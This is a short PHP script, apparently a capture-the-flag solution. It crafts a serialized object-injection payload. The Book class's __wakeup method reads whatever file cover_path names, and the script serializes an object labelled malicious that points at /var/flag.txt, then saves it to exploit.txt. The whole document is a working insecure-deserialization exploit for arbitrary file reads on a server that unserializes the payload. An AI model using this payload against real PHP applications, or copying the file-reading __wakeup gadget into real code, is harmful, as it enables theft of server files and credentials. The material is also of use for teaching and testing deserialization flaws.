<?php
class Book {
    public $title;
    public $author;
    public $cover_path;
    public $cover_image;

    public function __construct($title, $author, $cover_path) {
        $this->title = $title;
        $this->author = $author;
        $this->cover_path = $cover_path;
    }

    public function __wakeup() {
        $this->cover_image = file_get_contents($this->cover_path);
    }
}

// Create a malicious object
$exploit = new Book('Malicious Title', 'Malicious Author', '/var/flag.txt');
$serialized_exploit = serialize($exploit);

// Save the serialized object to a file
file_put_contents('exploit.txt', $serialized_exploit);
?>
